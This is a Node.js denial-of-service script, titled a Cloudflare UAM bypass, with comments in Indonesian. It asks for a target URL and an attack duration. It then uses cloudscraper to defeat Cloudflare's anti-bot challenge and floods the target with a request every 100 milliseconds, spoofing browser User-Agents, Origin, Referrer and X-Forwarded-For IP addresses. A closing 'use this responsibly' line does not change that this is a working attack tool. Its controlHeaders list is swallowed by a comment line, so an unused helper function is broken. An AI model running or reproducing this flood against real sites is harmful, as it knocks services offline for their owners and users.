import http from 'http';
import https from 'https';
import cloudscraper from 'cloudscraper';
import axios from 'axios';
import readline from 'readline';
import randomstring from 'randomstring';
import request from 'request';
import cryptoRandomString from 'crypto-random-string';
import path from 'path';
import { EventEmitter } from 'events';

// Disable max listeners warning
EventEmitter.defaultMaxListeners = 0;

// Daftar referensi acak
const referers = ['https://www.google.com/', 'https://www.bing.com/', 'https://www.yahoo.com/', 'https://www.duckduckgo.com/', 'https://www.ask.com/'];

// Daftar Accept headers acak
const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'application/json, text/javascript, */*; q=0.01',
    'application/json, text/plain, */*'
];

// Daftar Accept-Language headers acak
const acceptLanguageHeaders = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9'];

// Daftar Control Headers acak                                                          const controlHeaders = ['no-cache', 'max-age=0', 'no-store', 'must-revalidate'];

// Fungsi pembantu untuk elemen acak
function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

// Fungsi pembantu untuk User-Agent dan IP acak
function generateFakeUserAgent() {
    const browsers = ["Chrome", "Firefox", "Safari", "Edge"];
    const os = ["Windows NT 10.0", "Macintosh", "X11; Linux x86_64", "Android"];
    return `Mozilla/5.0 (${randomElement(os)}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomElement(browsers)}/91.0 Safari/537.36`;
}

function generateRandomIP() {
    return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
}

// Fungsi untuk mengirim request dengan Cloudsraper
async function sendRequest(url) {
    const headers = {
        'User-Agent': generateFakeUserAgent(),
        'Accept': randomElement(acceptHeaders),
        'Accept-Language': randomElement(acceptLanguageHeaders),
        'Referer': randomElement(referers),
        'Cache-Control': randomElement(controlHeaders),
        'Connection': 'keep-alive',
        'X-Forwarded-For': generateRandomIP(),
    };

    try {
        await axios.get(url, { headers });
        console.log(`Request sent to ${url}`);
    } catch (error) {
        console.error(`Failed request to ${url}: ${error.message}`);
    }
}

// Fungsi untuk mengirim request menggunakan cloudscraper
function startAttack(url, duration) {
    const endTime = Date.now() + duration * 1000;
    const interval = setInterval(() => {
        cloudscraper.get(url, (error, response) => {
            if (error) {
                console.error(`Error occurred: ${error.message}`);
                return;  // Menghentikan jika terjadi error
            }

            const cookie = response.request.headers.cookie;
            const userAgent = response.request.headers['User-Agent'];
            const rand = randomstring.generate({ length: 12, charset: 'abcdefghijklmnopqrstuvwxyz0123456789' });
            const ip = generateRandomIP();

            const options = {
                url,
                headers: {
                    'User-Agent': userAgent,
                    'Accept': randomElement(acceptHeaders),
                    'cookie': cookie,
                    'Origin': `http://${rand}.com`,
                    'Referrer': `http://google.com/${rand}`,
                    'X-Forwarded-For': ip,
                },
            };

            request(options, (err, res, body) => {
                if (err) {
                    console.error(`Request failed: ${err}`);
                }
                // Optional: Add logging for success or response details
            });
        });
    }, 100);

    setTimeout(() => clearInterval(interval), duration * 1000);
}

// Input interaktif
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

rl.question('Enter target URL: ', (url) => {
    if (!url.startsWith('http')) {
        console.error('Invalid URL. Must start with http:// or https://');
        rl.close();
        return;
    }

    rl.question('Enter attack duration (in seconds): ', (duration) => {
        const attackDuration = parseInt(duration);

        if (isNaN(attackDuration) || attackDuration <= 0) {
            console.error('Invalid duration.');
            rl.close();
            return;
        }

        console.log(`Attack started on ${url} for ${attackDuration} seconds.`);
        startAttack(url, attackDuration);
        rl.close();
    });
});

process.on('uncaughtException', (err) => {
    console.error(`Uncaught exception: ${err}`);
});

process.on('unhandledRejection', (err) => {
    console.error(`Unhandled promise rejection: ${err}`);
});

// Event untuk menangani proses keluar
process.on('SIGINT', () => {
    console.log('\nProcess terminated by user. Exiting...');
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('Process terminated by system. Exiting...');
    process.exit(0);
});

// Notifikasi jika serangan selesai
process.on('exit', () => {
    console.log('Attack session has ended. All tasks stopped.');
});

// Informasi tambahan
console.log(`
===========================
Cloudflare UAM Bypass Script
===========================
Instructions:
1. Enter the target URL (must include http:// or https://).
2. Specify the attack duration in seconds.
3. Enjoy testing your server! Remember to use this responsibly.
===========================
`);
